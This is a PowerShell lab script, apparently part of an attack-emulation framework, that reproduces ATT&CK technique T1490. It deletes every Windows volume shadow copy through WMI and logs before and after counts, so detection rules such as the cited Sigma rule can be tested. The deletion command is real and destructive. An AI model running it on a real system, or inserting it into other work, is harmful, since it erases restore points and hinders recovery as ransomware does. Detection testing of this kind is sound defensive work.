# Hesper lab action: delete volume shadow copies via WMI (T1490).
# Technique source: redcanaryco/atomic-red-team (MIT), technique T1490.
# Runs ONLY inside the bundled lab VMs, gated by the Hesper scope kernel.
#
# Contract with the vm adapter: parameters arrive via -ParamsFile (JSON).
# Expected params: { "out_dir": "C:\\hesper\\out", "marker": "shadow.marker" }

param(
    [Parameter(Mandatory = $true)]
    [string]$ParamsFile
)

$ErrorActionPreference = "Continue"
$params = Get-Content -Raw -Path $ParamsFile | ConvertFrom-Json
$outDir = if ($params.out_dir) { $params.out_dir } else { "C:\hesper\out" }
$marker = if ($params.marker) { $params.marker } else { "shadow.marker" }

New-Item -ItemType Directory -Force -Path $outDir | Out-Null

$before = Get-WmiObject Win32_ShadowCopy | Select-Object ID, InstallDate
$before | Format-Table -AutoSize | Tee-Object -FilePath "$outDir\before.txt"

# Technique: WMI-based shadow copy deletion (matches the Sigma rule
# "Deletion of Volume Shadow Copies via WMI with PowerShell").
Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }

$after = Get-WmiObject Win32_ShadowCopy | Select-Object ID, InstallDate
$after | Format-Table -AutoSize | Tee-Object -FilePath "$outDir\after.txt"

# Proof artifact: before/after delta (must_capture kind: file).
@("before=$($before.Count)", "after=$($after.Count)", (Get-Date -Format o)) |
    Out-File -FilePath (Join-Path $outDir $marker)

Write-Output "Shadow copies before=$($before.Count) after=$($after.Count)"
